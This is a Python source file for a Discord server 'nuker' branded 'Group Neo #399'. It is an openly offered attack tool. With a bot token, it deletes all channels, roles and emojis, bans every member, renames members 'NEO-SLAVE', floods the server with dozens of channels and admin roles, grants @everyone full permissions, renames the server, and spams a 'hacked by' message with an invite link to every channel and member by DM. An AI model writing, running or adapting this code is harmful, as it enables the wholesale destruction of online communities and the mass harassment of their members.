#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Group Neo #399 | mero: xa4k
Version: 10.0
"""

import os
import sys
import time
import requests
import json
import asyncio
import aiohttp

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except:
    class Fore:
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BLUE = '\033[94m'
        CYAN = '\033[96m'
        MAGENTA = '\033[95m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'

GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RED = Fore.RED
BLUE = Fore.BLUE
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
WHITE = Fore.WHITE
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

ANNOUNCEMENT_MESSAGE = """** hacked by Group Neo #399**
https://discord.gg/FKX5DDjGU
@here  @everyone"""

def input_red(prompt):
    print(f"{RED}{prompt}{RESET}", end='')
    return input()

def input_yellow(prompt):
    print(f"{YELLOW}{prompt}{RESET}", end='')
    return input()

def input_cyan(prompt):
    print(f"{CYAN}{prompt}{RESET}", end='')
    return input()

def input_magenta(prompt):
    print(f"{MAGENTA}{prompt}{RESET}", end='')
    return input()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_logo():
    logo = rf"""
{GREEN}             $$\ $$\    $$$$$$\   $$$$$$\   $$$$$$\  
{GREEN}  $$ \$$ \  $$ ___$$\ $$  __$$\ $$  __$$\ 
{GREEN}$$$$$$$$$$\ \_/   $$ |$$ /  $$ |$$ /  $$ |
{GREEN}\_$$  $$   |  $$$$$ / \$$$$$$$ |\$$$$$$$ |
{GREEN}$$$$$$$$$$\   \___$$\  \____$$ | \____$$ |
{GREEN}\_$$  $$  _|$$\   $$ |$$\   $$ |$$\   $$ |
{GREEN}  $$ |$$ |  \$$$$$$  |\$$$$$$  |\$$$$$$  |
{GREEN}  \__|\__|   \______/  \______/  \______/ 
{CYAN}                                          
{CYAN}                                   Group Neo #399
{CYAN}                                   mero: xa4k
{WHITE}
{YELLOW}GRoupNeo@399:~$ {RESET}"""
    print(logo)

def show_second_screen(guild_name, guild_id):
    screen = rf"""
{GREEN}      :::::::                ::::::      
{GREEN}    :::@@@@:::::::::::::::::::%@@@:::    
{GREEN}  :::%@=:::@:::=@@@%#%%@@=:::@=::=@#:::  
{GREEN}  ::@*::::=@#@@+:::::::::+@@*@=::::*@::  
{GREEN}  ::@*::::::##:::::::::::::*%::::::+@::  
{GREEN}  :::%@@@@::-###############+::%@@@@:::  
{GREEN}    ::-@@@@@#################%@@@@#::    
{GREEN}    ::*@+===-:::::::::::::::-====%@::    
{GREEN}     :::::=@=::-@@@:::%@@+:::@*::::::    
{GREEN}        :::*@=:+@@@:::@@@%::@#::         
{GREEN}          :::@%:::::%:::::%@=::          
{GREEN}       :::::+@%:::*---*:::%@+:::::       
{GREEN}     ::-@@@@%::::+::#::*::::@@@@@:::     
{GREEN}    ::=@:::::::::=::#::*:::::::::@-::    
{GREEN}    ::=@:::::%@+:::::::::=@%:::::@-::    
{GREEN}     :::%@:::%@@%:::::::%@@*:::@%:::     
{GREEN}      :::+@@@%:::+@@@@@+:::%@@@+:::      
{GREEN}        ::::::: ::::::::: :::::::        
{WHITE}
{CYAN}Group Neo #399 | mero: xa4k
{WHITE}
{RED}[x] Server Name : {guild_name}[x]
{RED}[x] Server ID : {guild_id}[x]
{WHITE}
{GREEN}[1] Delete Channels.          [6] Delete All Roles.
{GREEN}[2] Create Channels.          [7] Permission for @everyone.
{GREEN}[3] #399 Nuker.               [8] Delete All Emojis.
{GREEN}[4] Rename Channels.          [9] Ban All Members.
{GREEN}[5] Create Roles.             [10] Change All Member Names.
{MAGENTA}[11] ! Faisal ♪              [12] Exit
{WHITE}
{YELLOW}GRoupNeo@399:~$ {RESET}"""
    print(screen)

async def send_announcement_to_all_channels(session, headers, guild_id, message):
    url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
    try:
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                channels = await resp.json()
                tasks = []
                channel_count = 0
                
                for channel in channels:
                    if channel['type'] == 0:
                        channel_count += 1
                        msg_url = f'https://discord.com/api/v9/channels/{channel["id"]}/messages'
                        data = {'content': message}
                        tasks.append(session.post(msg_url, headers=headers, json=data))
                
                if tasks:
                    print(f"{YELLOW}Sending announcement to {channel_count} channels...{RESET}")
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    success = 0
                    for r in results:
                        if not isinstance(r, Exception) and hasattr(r, 'status') and r.status == 200:
                            success += 1
                    
                    print(f"{GREEN}✓ Sent to {success}/{channel_count} channels{RESET}")
                else:
                    print(f"{YELLOW}No text channels found{RESET}")
    except Exception as e:
        print(f"{RED}✗ Error sending to channels: {e}{RESET}")

async def send_announcement_to_all_members(session, headers, guild_id, bot_id, message):
    url = f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000'
    try:
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                members = await resp.json()
                tasks = []
                member_count = 0
                
                for member in members:
                    if member['user']['id'] != bot_id:
                        member_count += 1
                        dm_url = 'https://discord.com/api/v9/users/@me/channels'
                        dm_data = {'recipient_id': member['user']['id']}
                        
                        try:
                            async with session.post(dm_url, headers=headers, json=dm_data) as dm_resp:
                                if dm_resp.status == 200:
                                    dm_channel = await dm_resp.json()
                                    msg_url = f'https://discord.com/api/v9/channels/{dm_channel["id"]}/messages'
                                    msg_data = {'content': message}
                                    tasks.append(session.post(msg_url, headers=headers, json=msg_data))
                        except:
                            pass
                
                if tasks:
                    print(f"{YELLOW}Sending DM to {member_count} members...{RESET}")
                    batch_size = 5
                    success = 0
                    
                    for i in range(0, len(tasks), batch_size):
                        batch = tasks[i:i+batch_size]
                        results = await asyncio.gather(*batch, return_exceptions=True)
                        
                        for r in results:
                            if not isinstance(r, Exception) and hasattr(r, 'status') and r.status == 200:
                                success += 1
                        
                        await asyncio.sleep(1)
                    
                    print(f"{GREEN}✓ Sent DM to {success}/{member_count} members{RESET}")
                else:
                    print(f"{YELLOW}No members to DM (except bot){RESET}")
    except Exception as e:
        print(f"{RED}✗ Error sending DMs: {e}{RESET}")

async def send_announcement_to_all(self, guild_id):
    print(f"\n{MAGENTA}📢 Sending announcement...{RESET}")
    
    await send_announcement_to_all_channels(self.session, self.headers, guild_id, ANNOUNCEMENT_MESSAGE)
    await send_announcement_to_all_members(self.session, self.headers, guild_id, self.bot_id, ANNOUNCEMENT_MESSAGE)
    
    print(f"{MAGENTA}✓ Announcement completed{RESET}\n")

async def check_bot_in_guild(session, token, guild_id):
    headers = {'Authorization': f'Bot {token}'}
    
    url_me = 'https://discord.com/api/v9/users/@me'
    try:
        async with session.get(url_me, headers=headers) as resp:
            if resp.status != 200:
                return False, f"Invalid token (code {resp.status})"
            bot_data = await resp.json()
            bot_id = bot_data.get('id')
            bot_name = bot_data.get('username', 'Unknown')
    except Exception as e:
        return False, f"Connection failed: {e}"
    
    url_guild = f'https://discord.com/api/v9/guilds/{guild_id}/members/{bot_id}'
    try:
        async with session.get(url_guild, headers=headers) as resp:
            if resp.status == 200:
                return True, bot_name
            else:
                return False, f"Bot is not in this server (code {resp.status})"
    except Exception as e:
        return False, f"Failed to verify server: {e}"

async def get_server_info(session, token, guild_id):
    headers = {'Authorization': f'Bot {token}'}
    url = f'https://discord.com/api/v9/guilds/{guild_id}'
    
    try:
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json()
                return data.get('name', 'Unknown'), data.get('id', guild_id)
            else:
                return 'Unknown', guild_id
    except:
        return 'Unknown', guild_id

class DiscordNuker:
    def __init__(self, token):
        self.token = token
        self.session = None
        self.bot_name = ""
        self.bot_id = ""
        self.guild_id = ""
        self.guild_name = ""
        self.headers = {'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}
        
    async def init_session(self):
        self.session = aiohttp.ClientSession()
        
    async def close_session(self):
        if self.session:
            await self.session.close()
    
    async def get_bot_info(self):
        url = 'https://discord.com/api/v9/users/@me'
        try:
            async with self.session.get(url, headers=self.headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    self.bot_name = data.get('username', 'Unknown')
                    self.bot_id = data.get('id', '')
                    return True, self.bot_name
                else:
                    return False, f"Code {resp.status}"
        except Exception as e:
            return False, str(e)
    
    async def delete_all_channels(self, guild_id):
        url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
        try:
            async with self.session.get(url, headers=self.headers) as resp:
                if resp.status == 200:
                    channels = await resp.json()
                    print(f"\n{YELLOW}Found {len(channels)} channels. Starting deletion...{RESET}")
                    
                    tasks = []
                    channel_ids = []
                    channel_names = []
                    for channel in channels:
                        if channel['type'] in [0, 2, 4, 5]:
                            channel_ids.append(channel['id'])
                            channel_names.append(channel.get('name', 'Unknown'))
                            del_url = f'https://discord.com/api/v9/channels/{channel["id"]}'
                            tasks.append(self.session.delete(del_url, headers=self.headers))
                    
                    if tasks:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        
                        for i, r in enumerate(results):
                            channel_id = channel_ids[i]
                            channel_name = channel_names[i]
                            if not isinstance(r, Exception) and hasattr(r, 'status'):
                                if r.status in [200, 204]:
                                    print(f"{GREEN}  ✓ Deleted channel: {channel_id} ({channel_name}){RESET}")
                                else:
                                    print(f"{RED}  ✗ Failed to delete {channel_id} ({channel_name}) - Status: {r.status}{RESET}")
                            else:
                                print(f"{RED}  ✗ Failed to delete {channel_id} ({channel_name}) - Error{RESET}")
                        
                        deleted = sum(1 for r in results if not isinstance(r, Exception) and hasattr(r, 'status') and r.status in [200, 204])
                        print(f"\n{GREEN}✓ Total: {deleted}/{len(channel_ids)} channels deleted{RESET}")
                    else:
                        print(f"{YELLOW}No channels to delete{RESET}")
                    return True
        except Exception as e:
            print(f"{RED}✗ Error deleting channels: {e}{RESET}")
            return False
    
    async def create_channels(self, guild_id, name="nuked-by-neo", count=50):
        url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
        tasks = []
        
        print(f"\n{YELLOW}Creating {count} channels with name '{name}'...{RESET}")
        
        for i in range(count):
            data = {'name': name, 'type': 0}
            tasks.append(self.session.post(url, headers=self.headers, json=data))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        created = 0
        for i, r in enumerate(results):
            if not isinstance(r, Exception) and hasattr(r, 'status'):
                if r.status == 201:
                    created += 1
                    try:
                        data = await r.json()
                        channel_id = data.get('id', 'Unknown')
                        print(f"{GREEN}  ✓ Created channel: {channel_id}{RESET}")
                    except:
                        print(f"{GREEN}  ✓ Created channel #{i+1}{RESET}")
                else:
                    print(f"{RED}  ✗ Failed to create channel #{i+1} (Status: {r.status}){RESET}")
            else:
                print(f"{RED}  ✗ Failed to create channel #{i+1} (Error){RESET}")
        
        print(f"\n{GREEN}✓ Total: {created}/{count} channels created with name '{name}'{RESET}")
        return created
    
    async def nuker_399(self, guild_id):
        print(f"\n{YELLOW}🚀 Starting #399 massive attack...{RESET}\n")
        
        await self.delete_all_channels(guild_id)
        print()
        await self.delete_all_roles(guild_id)
        print()
        await self.delete_all_emojis(guild_id)
        print()
        await self.create_channels(guild_id, "NEO-RAID", 100)
        print()
        await self.create_roles(guild_id, "RAIDED", 100)
        print()
        await self.rename_guild(guild_id, "NUKED BY Neo#399")
        
        print(f"\n{GREEN}✓ Massive attack completed!{RESET}")
    
    async def rename_channels(self, guild_id, new_name="NEO-OWNED"):
        url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
        try:
            async with self.session.get(url, headers=self.headers) as resp:
                if resp.status == 200:
                    channels = await resp.json()
                    print(f"\n{YELLOW}Renaming channels to '{new_name}'...{RESET}")
                    
                    tasks = []
                    channel_ids = []
                    channel_names = []
                    for channel in channels:
                        if channel['type'] in [0, 2]:
                            channel_ids.append(channel['id'])
                            channel_names.append(channel.get('name', 'Unknown'))
                            edit_url = f'https://discord.com/api/v9/channels/{channel["id"]}'
                            data = {'name': new_name}
                            tasks.append(self.session.patch(edit_url, headers=self.headers, json=data))
                    
                    if tasks:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        
                        for i, r in enumerate(results):
                            channel_id = channel_ids[i]
                            channel_name = channel_names[i]
                            if not isinstance(r, Exception) and hasattr(r, 'status'):
                                if r.status == 200:
                                    print(f"{GREEN}  ✓ Renamed channel: {channel_id} ({channel_name}) -> {new_name}{RESET}")
                                else:
                                    print(f"{RED}  ✗ Failed to rename {channel_id} ({channel_name}) - Status: {r.status}{RESET}")
                            else:
                                print(f"{RED}  ✗ Failed to rename {channel_id} ({channel_name}) - Error{RESET}")
                        
                        renamed = sum(1 for r in results if not isinstance(r, Exception) and hasattr(r, 'status') and r.status == 200)
                        print(f"\n{GREEN}✓ Total: {renamed}/{len(channel_ids)} channels renamed{RESET}")
                    else:
                        print(f"{YELLOW}No channels to rename{RESET}")
        except Exception as e:
            print(f"{RED}✗ Error: {e}{RESET}")
    
    async def create_roles(self, guild_id, name="RAIDED", count=50):
        url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
        tasks = []
        colors = [0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF]
        
        print(f"\n{YELLOW}Creating {count} roles with name '{name}'...{RESET}")
        
        for i in range(count):
            data = {
                'name': f'{name}-{i+1}',
                'color': colors[i % len(colors)],
                'hoist': True,
                'mentionable': True,
                'permissions': '8'
            }
            tasks.append(self.session.post(url, headers=self.headers, json=data))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        created = 0
        for i, r in enumerate(results):
            if not isinstance(r, Exception) and hasattr(r, 'status'):
                if r.status == 200:
                    created += 1
                    try:
                        data = await r.json()
                        role_id = data.get('id', 'Unknown')
                        print(f"{GREEN}  ✓ Created role: {role_id} ({name}-{i+1}){RESET}")
                    except:
                        print(f"{GREEN}  ✓ Created role #{i+1}{RESET}")
                else:
                    print(f"{RED}  ✗ Failed to create role #{i+1} (Status: {r.status}){RESET}")
            else:
                print(f"{RED}  ✗ Failed to create role #{i+1} (Error){RESET}")
        
        print(f"\n{GREEN}✓ Total: {created}/{count} roles created{RESET}")
        return created
    
    async def delete_all_roles(self, guild_id):
        url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
        try:
            async with self.session.get(url, headers=self.headers) as resp:
                if resp.status == 200:
                    roles = await resp.json()
                    print(f"\n{YELLOW}Found {len(roles)} roles. Starting deletion...{RESET}")
                    
                    tasks = []
                    role_ids = []
                    role_names = []
                    for role in roles:
                        if role['name'] != '@everyone':
                            role_ids.append(role['id'])
                            role_names.append(role['name'])
                            del_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role["id"]}'
                            tasks.append(self.session.delete(del_url, headers=self.headers))
                    
                    if tasks:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        
                        for i, r in enumerate(results):
                            role_id = role_ids[i]
                            role_name = role_names[i]
                            if not isinstance(r, Exception) and hasattr(r, 'status'):
                                if r.status in [200, 204]:
                                    print(f"{GREEN}  ✓ Deleted role: {role_id} ({role_name}){RESET}")
                                else:
                                    print(f"{RED}  ✗ Failed to delete {role_id} ({role_name}) - Status: {r.status}{RESET}")
                            else:
                                print(f"{RED}  ✗ Failed to delete {role_id} ({role_name}) - Error{RESET}")
                        
                        deleted = sum(1 for r in results if not isinstance(r, Exception) and hasattr(r, 'status') and r.status in [200, 204])
                        print(f"\n{GREEN}✓ Total: {deleted}/{len(role_ids)} roles deleted{RESET}")
                    else:
                        print(f"{YELLOW}No roles to delete (except @everyone){RESET}")
        except Exception as e:
            print(f"{RED}✗ Error: {e}{RESET}")
    
    async def permission_everyone(self, guild_id):
        roles_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
        
        try:
            async with self.session.get(roles_url, headers=self.headers) as resp:
                if resp.status == 200:
                    roles = await resp.json()
                    
                    everyone_role_id = None
                    for role in roles:
                        if role['name'] == '@everyone':
                            everyone_role_id = role['id']
                            break
                    
                    if not everyone_role_id:
                        print(f"{RED}✗ Could not find @everyone role{RESET}")
                        return
                    
                    url = f'https://discord.com/api/v9/guilds/{guild_id}/roles/{everyone_role_id}'
                    permissions_value = "2147483647"
                    data = {'permissions': permissions_value}
                    
                    print(f"\n{YELLOW}Granting admin permissions to @everyone (Role ID: {everyone_role_id})...{RESET}")
                    
                    async with self.session.patch(url, headers=self.headers, json=data) as patch_resp:
                        if patch_resp.status == 200:
                            print(f"{GREEN}✓ Granted admin permissions to @everyone (All permissions){RESET}")
                        else:
                            error_text = await patch_resp.text()
                            print(f"{RED}✗ Failed to change permissions (code: {patch_resp.status}){RESET}")
                            
                            alt_values = ["8", "2146958591", "1073741824"]
                            for alt_val in alt_values:
                                alt_data = {'permissions': alt_val}
                                async with self.session.patch(url, headers=self.headers, json=alt_data) as alt_resp:
                                    if alt_resp.status == 200:
                                        print(f"{GREEN}✓ Granted permissions with value: {alt_val}{RESET}")
                                        return
                            
                            print(f"{RED}✗ All permission values failed.{RESET}")
                else:
                    print(f"{RED}✗ Failed to fetch roles (code: {resp.status}){RESET}")
                    
        except Exception as e:
            print(f"{RED}✗ Error: {e}{RESET}")
    
    async def delete_all_emojis(self, guild_id):
        url = f'https://discord.com/api/v9/guilds/{guild_id}/emojis'
        try:
            async with self.session.get(url, headers=self.headers) as resp:
                if resp.status == 200:
                    emojis = await resp.json()
                    print(f"\n{YELLOW}Found {len(emojis)} emojis. Starting deletion...{RESET}")
                    
                    tasks = []
                    emoji_ids = []
                    emoji_names = []
                    for emoji in emojis:
                        emoji_ids.append(emoji['id'])
                        emoji_names.append(emoji.get('name', 'Unknown'))
                        del_url = f'https://discord.com/api/v9/guilds/{guild_id}/emojis/{emoji["id"]}'
                        tasks.append(self.session.delete(del_url, headers=self.headers))
                    
                    if tasks:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        
                        for i, r in enumerate(results):
                            emoji_id = emoji_ids[i]
                            emoji_name = emoji_names[i]
                            if not isinstance(r, Exception) and hasattr(r, 'status'):
                                if r.status in [200, 204]:
                                    print(f"{GREEN}  ✓ Deleted emoji: {emoji_id} ({emoji_name}){RESET}")
                                else:
                                    print(f"{RED}  ✗ Failed to delete {emoji_id} ({emoji_name}) - Status: {r.status}{RESET}")
                            else:
                                print(f"{RED}  ✗ Failed to delete {emoji_id} ({emoji_name}) - Error{RESET}")
                        
                        deleted = sum(1 for r in results if not isinstance(r, Exception) and hasattr(r, 'status') and r.status in [200, 204])
                        print(f"\n{GREEN}✓ Total: {deleted}/{len(emoji_ids)} emojis deleted{RESET}")
                    else:
                        print(f"{YELLOW}No emojis to delete{RESET}")
        except Exception as e:
            print(f"{RED}✗ Error: {e}{RESET}")
    
    async def ban_all_members(self, guild_id):
        url = f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000'
        try:
            async with self.session.get(url, headers=self.headers) as resp:
                if resp.status == 200:
                    members = await resp.json()
                    print(f"\n{YELLOW}Found {len(members)} members. Starting banning...{RESET}")
                    
                    tasks = []
                    member_ids = []
                    member_names = []
                    
                    for member in members:
                        if member['user']['id'] != self.bot_id:
                            member_ids.append(member['user']['id'])
                            member_names.append(member['user'].get('username', 'Unknown'))
                            ban_url = f'https://discord.com/api/v9/guilds/{guild_id}/bans/{member["user"]["id"]}'
                            tasks.append(self.session.put(ban_url, headers=self.headers))
                    
                    if tasks:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        
                        for i, r in enumerate(results):
                            member_id = member_ids[i]
                            member_name = member_names[i]
                            if not isinstance(r, Exception) and hasattr(r, 'status'):
                                if r.status in [200, 204]:
                                    print(f"{GREEN}  ✓ Banned: {member_id} ({member_name}){RESET}")
                                else:
                                    print(f"{RED}  ✗ Failed to ban {member_id} ({member_name}) - Status: {r.status}{RESET}")
                            else:
                                print(f"{RED}  ✗ Failed to ban {member_id} ({member_name}) - Error{RESET}")
                        
                        banned = sum(1 for r in results if not isinstance(r, Exception) and hasattr(r, 'status') and r.status in [200, 204])
                        print(f"\n{GREEN}✓ Total: {banned}/{len(member_ids)} members banned{RESET}")
                    else:
                        print(f"{YELLOW}No members to ban (except the bot){RESET}")
        except Exception as e:
            print(f"{RED}✗ Error: {e}{RESET}")
    
    async def rename_all_members(self, guild_id, new_name="NEO-SLAVE"):
        url = f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000'
        try:
            async with self.session.get(url, headers=self.headers) as resp:
                if resp.status == 200:
                    members = await resp.json()
                    print(f"\n{YELLOW}Found {len(members)} members. Renaming to '{new_name}'...{RESET}")
                    
                    tasks = []
                    member_ids = []
                    member_names = []
                    
                    for member in members:
                        if member['user']['id'] != self.bot_id:
                            member_ids.append(member['user']['id'])
                            member_names.append(member['user'].get('username', 'Unknown'))
                            nick_url = f'https://discord.com/api/v9/guilds/{guild_id}/members/{member["user"]["id"]}'
                            data = {'nick': new_name}
                            tasks.append(self.session.patch(nick_url, headers=self.headers, json=data))
                    
                    if tasks:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        
                        for i, r in enumerate(results):
                            member_id = member_ids[i]
                            member_name = member_names[i]
                            if not isinstance(r, Exception) and hasattr(r, 'status'):
                                if r.status == 200:
                                    print(f"{GREEN}  ✓ Renamed: {member_id} ({member_name}) -> {new_name}{RESET}")
                                else:
                                    print(f"{RED}  ✗ Failed to rename {member_id} ({member_name}) - Status: {r.status}{RESET}")
                            else:
                                print(f"{RED}  ✗ Failed to rename {member_id} ({member_name}) - Error{RESET}")
                        
                        renamed = sum(1 for r in results if not isinstance(r, Exception) and hasattr(r, 'status') and r.status == 200)
                        print(f"\n{GREEN}✓ Total: {renamed}/{len(member_ids)} members renamed{RESET}")
                    else:
                        print(f"{YELLOW}No members to rename (except the bot){RESET}")
        except Exception as e:
            print(f"{RED}✗ Error: {e}{RESET}")
    
    async def rename_guild(self, guild_id, new_name):
        url = f'https://discord.com/api/v9/guilds/{guild_id}'
        data = {'name': new_name}
        try:
            async with self.session.patch(url, headers=self.headers, json=data) as resp:
                if resp.status == 200:
                    print(f"\n{GREEN}✓ Server renamed to {new_name}{RESET}")
                else:
                    print(f"\n{RED}✗ Failed to rename server (code: {resp.status}){RESET}")
        except Exception as e:
            print(f"\n{RED}✗ Error: {e}{RESET}")

async def main():
    global ANNOUNCEMENT_MESSAGE
    
    clear_screen()
    show_logo()
    
    token = input_red("\n[$] token: ").strip()
    
    nuker = DiscordNuker(token)
    await nuker.init_session()
    
    print(f"{YELLOW}Logging in bot...{RESET}")
    success, bot_name = await nuker.get_bot_info()
    
    if not success:
        print(f"{RED}✗ Login failed! {bot_name}{RESET}")
        print(f"{YELLOW}Possible reasons:{RESET}")
        print(f"  1. Invalid token")
        print(f"  2. Not a bot token")
        print(f"  3. Bot is disabled or deleted")
        await nuker.close_session()
        input_red("\nPress Enter to exit...")
        return
    
    print(f"{GREEN}✓ Logged in as: {bot_name}{RESET}\n")
    
    print(f"{CYAN}[1] - Nuke when the bot joins{RESET}")
    print(f"{CYAN}[2] - Menu{RESET}")
    
    choice1 = input_cyan("\n[>]: ").strip()
    
    guild_id = input_red("\n[>] Server ID: ").strip()
    
    print(f"{YELLOW}Checking if bot is in server...{RESET}")
    bot_in_guild, bot_name = await check_bot_in_guild(nuker.session, token, guild_id)
    
    if not bot_in_guild:
        print(f"{RED}✗ {bot_name}{RESET}")
        print(f"{YELLOW}Make sure the bot is in the server and has proper permissions{RESET}")
        await nuker.close_session()
        input_red("\nPress Enter to exit...")
        return
    
    print(f"{GREEN}✓ Bot {bot_name} is in the server{RESET}\n")
    
    nuker.guild_id = guild_id
    
    guild_name, _ = await get_server_info(nuker.session, token, guild_id)
    nuker.guild_name = guild_name
    
    while True:
        clear_screen()
        show_second_screen(guild_name, guild_id)
        
        choice = input_yellow("").strip().lower()
        
        if choice == '11':
            print(f"\n{MAGENTA}═════════════════════════════════════════════{RESET}")
            print(f"{MAGENTA}       ! 𝐅𝐚𝐢𝐬𝐚𝐥 ♪{RESET}")
            print(f"{MAGENTA}═════════════════════════════════════════════{RESET}")
            print(f"{YELLOW}Current announcement message:{RESET}")
            print(f"{WHITE}{ANNOUNCEMENT_MESSAGE}{RESET}")
            print(f"\n{YELLOW}Enter new announcement message:{RESET}")
            print(f"{CYAN}(Type your message. Use @here and @everyone if needed){RESET}")
            
            new_message = input_magenta("\n[>] New message: ").strip()
            
            if new_message:
                ANNOUNCEMENT_MESSAGE = new_message
                print(f"{GREEN}✓ Announcement message updated successfully!{RESET}")
            else:
                print(f"{YELLOW}No changes made. Keeping current message.{RESET}")
            
            print(f"\n{YELLOW}Press Enter to continue...{RESET}")
            input()
        
        elif choice == '12':
            print(f"\n{GREEN}Exiting... Goodbye!{RESET}")
            break
        
        elif choice == '1':
            await nuker.delete_all_channels(guild_id)
            await send_announcement_to_all_channels(nuker.session, nuker.headers, guild_id, ANNOUNCEMENT_MESSAGE)
            await send_announcement_to_all_members(nuker.session, nuker.headers, guild_id, nuker.bot_id, ANNOUNCEMENT_MESSAGE)
            print(f"\n{YELLOW}Press Enter to continue...{RESET}")
            input()
            
        elif choice == '2':
            name = input_cyan("Enter channel name (default: nuked-by-neo): ") or "nuked-by-neo"
            count = input_cyan("Number of channels (default: 50): ") or "50"
            try:
                await nuker.create_channels(guild_id, name, int(count))
                await send_announcement_to_all_channels(nuker.session, nuker.headers, guild_id, ANNOUNCEMENT_MESSAGE)
                await send_announcement_to_all_members(nuker.session, nuker.headers, guild_id, nuker.bot_id, ANNOUNCEMENT_MESSAGE)
            except:
                print(f"{RED}✗ Please enter a valid number{RESET}")
            print(f"\n{YELLOW}Press Enter to continue...{RESET}")
            input()
            
        elif choice == '3':
            await nuker.nuker_399(guild_id)
            await send_announcement_to_all_channels(nuker.session, nuker.headers, guild_id, ANNOUNCEMENT_MESSAGE)
            await send_announcement_to_all_members(nuker.session, nuker.headers, guild_id, nuker.bot_id, ANNOUNCEMENT_MESSAGE)
            print(f"\n{YELLOW}Press Enter to continue...{RESET}")
            input()
            
        elif choice == '4':
            new_name = input_cyan("New channel name: ") or "NEO-OWNED"
            await nuker.rename_channels(guild_id, new_name)
            await send_announcement_to_all_channels(nuker.session, nuker.headers, guild_id, ANNOUNCEMENT_MESSAGE)
            await send_announcement_to_all_members(nuker.session, nuker.headers, guild_id, nuker.bot_id, ANNOUNCEMENT_MESSAGE)
            print(f"\n{YELLOW}Press Enter to continue...{RESET}")
            input()
            
        elif choice == '5':
            name = input_cyan("Role name (default: RAIDED): ") or "RAIDED"
            count = input_cyan("Number of roles (default: 50): ") or "50"
            try:
                await nuker.create_roles(guild_id, name, int(count))
                await send_announcement_to_all_channels(nuker.session, nuker.headers, guild_id, ANNOUNCEMENT_MESSAGE)
                await send_announcement_to_all_members(nuker.session, nuker.headers, guild_id, nuker.bot_id, ANNOUNCEMENT_MESSAGE)
            except:
                print(f"{RED}✗ Please enter a valid number{RESET}")
            print(f"\n{YELLOW}Press Enter to continue...{RESET}")
            input()
            
        elif choice == '6':
            await nuker.delete_all_roles(guild_id)
            await send_announcement_to_all_channels(nuker.session, nuker.headers, guild_id, ANNOUNCEMENT_MESSAGE)
            await send_announcement_to_all_members(nuker.session, nuker.headers, guild_id, nuker.bot_id, ANNOUNCEMENT_MESSAGE)
            print(f"\n{YELLOW}Press Enter to continue...{RESET}")
            input()
            
        elif choice == '7':
            await nuker.permission_everyone(guild_id)
            await send_announcement_to_all_channels(nuker.session, nuker.headers, guild_id, ANNOUNCEMENT_MESSAGE)
            await send_announcement_to_all_members(nuker.session, nuker.headers, guild_id, nuker.bot_id, ANNOUNCEMENT_MESSAGE)
            print(f"\n{YELLOW}Press Enter to continue...{RESET}")
            input()
            
        elif choice == '8':
            await nuker.delete_all_emojis(guild_id)
            await send_announcement_to_all_channels(nuker.session, nuker.headers, guild_id, ANNOUNCEMENT_MESSAGE)
            await send_announcement_to_all_members(nuker.session, nuker.headers, guild_id, nuker.bot_id, ANNOUNCEMENT_MESSAGE)
            print(f"\n{YELLOW}Press Enter to continue...{RESET}")
            input()
            
        elif choice == '9':
            await nuker.ban_all_members(guild_id)
            await send_announcement_to_all_channels(nuker.session, nuker.headers, guild_id, ANNOUNCEMENT_MESSAGE)
            await send_announcement_to_all_members(nuker.session, nuker.headers, guild_id, nuker.bot_id, ANNOUNCEMENT_MESSAGE)
            print(f"\n{YELLOW}Press Enter to continue...{RESET}")
            input()
            
        elif choice == '10':
            new_name = input_cyan("New nickname for members: ") or "NEO-SLAVE"
            await nuker.rename_all_members(guild_id, new_name)
            await send_announcement_to_all_channels(nuker.session, nuker.headers, guild_id, ANNOUNCEMENT_MESSAGE)
            await send_announcement_to_all_members(nuker.session, nuker.headers, guild_id, nuker.bot_id, ANNOUNCEMENT_MESSAGE)
            print(f"\n{YELLOW}Press Enter to continue...{RESET}")
            input()
            
        elif choice == 'exit' or choice == 'quit':
            break
            
        else:
            print(f"{RED}Invalid choice!{RESET}")
            print(f"{YELLOW}Press Enter to continue...{RESET}")
            input()

    await nuker.close_session()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Exited...{RESET}")
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
        input_red("Press Enter to exit...")